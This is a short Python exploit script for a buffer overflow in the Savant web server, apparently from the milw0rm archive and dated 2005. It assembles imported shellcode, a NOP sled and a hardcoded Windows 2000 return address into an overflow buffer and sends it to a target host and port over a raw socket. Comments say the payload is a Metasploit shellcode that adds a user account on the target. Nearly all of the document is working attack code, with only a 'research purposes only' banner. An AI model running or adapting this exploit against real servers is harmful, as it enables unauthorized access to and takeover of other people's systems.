#########################################################
#                                                       #
# Savant web server Buffer Overflow Exploit             #
# Discovered by : Mati Aharoni                          #
# Coded by : Tal Zeltzer and Mati Aharoni               #
# www.see-security.com                                  #
# FOR RESEACRH PURPOSES ONLY!                           #
#########################################################
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):
    sc = buf
    sc += b"\x90" * 21 
    # win32_adduser - PASS=pwd EXITFUNC=thread USER=X Size=232 Encoder=PexFnstenvSub http://metasploit.com
    sc += b"AA"
    # Win2k SP0,1,2,3,4
    #Change Return address as needed
    buffer = b"\xEB\x19" + b" /" + sc + struct.pack(b"<L",0x750236b2) + b"\r\n\r\n"
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target_machine,target_port))
    s.send(buffer)
    s.close()

    # milw0rm.com [2005-02-01]